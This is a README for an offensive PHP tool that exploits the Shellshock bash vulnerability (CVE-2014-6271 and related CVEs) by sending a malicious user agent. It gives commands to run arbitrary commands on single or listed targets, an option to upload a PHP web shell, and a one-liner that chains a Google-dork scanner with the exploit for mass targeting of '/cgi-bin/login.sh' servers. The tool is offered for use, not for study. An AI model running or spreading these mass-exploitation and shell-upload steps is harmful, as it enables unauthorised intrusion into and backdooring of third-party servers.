- Xpl-SHELLSHOCK-Ch3ck
------
The tool inject a malicious user agent that allows exploring the vulnerabildiade   sheelshock running server-side commands.

```
  # SCRIPT by: [ I N U R L  -  B R A S I L ] - [ By GoogleINURL ]
  # EXPLOIT NAME:  Xpl SHELLSHOCK Ch3ck Tool - (MASS)/ INURL BRASIL
  # AUTOR:         Cleiton Pinheiro / Nick: googleINURL
  # Email:         inurlbr@gmail.com
  # Blog:          http://blog.inurl.com.br
  # Twitter:       https://twitter.com/googleinurl
  # Fanpage:       https://fb.com/InurlBrasil
  # Pastebin       http://pastebin.com/u/Googleinurl
  # GIT:           https://github.com/googleinurl
  # PSS:           http://packetstormsecurity.com/user/googleinurl
  # YOUTUBE:       http://youtube.com/c/INURLBrasil
  # PLUS:          http://google.com/+INURLBrasil
  ```
  
- DESCRIPTION - VULNERABILITY(SHELLSHOCK)
------
```
- CVE-2014-6271, CVE-2014-6277,
- CVE-2014-6278, CVE-2014-7169,
- CVE-2014-7186, CVE-2014-7187
Is a vulnerability in GNU's bash shell that gives attackers access
to run remote commands on a vulnerable system.
```

- DESCRIPTION - TOOL
------
```
The tool inject a malicious user agent that allows exploring the vulnerabildiade
sheelshock running server-side commands.
``` 

-  Dependencies:
------
```
sudo apt-get install php5 php5-cli php5-curl
``

 - Execute:
------
```
  -t : SET TARGET.
  -f : SET FILE TARGETS.
  -c : SET COMMAND.
  -w : SET UPLOAD SHELL PHP.
  Execute:
  php xplSHELLSHOCK.php -t target -c command
  php xplSHELLSHOCK.php -f targets.txt -c command
  SHELL UPLOAD: php xplSHELLSHOCK.php -t target -c command -w
  OUTPUT VULN: SHELLSHOCK_vull.txt
```

 - EXPLOIT MASS USE SCANNER INURLBR
------
```
./inurlbr.php --dork 'inurl:"/cgi-bin/login.sh"' -s out.txt -q 1,6 --command-vul "php xpl.php -t '_TARGETFULL_' -c pwd"
```
More details about inurlbr scanner: https://github.com/googleinurl/SCANNER-INURLBR
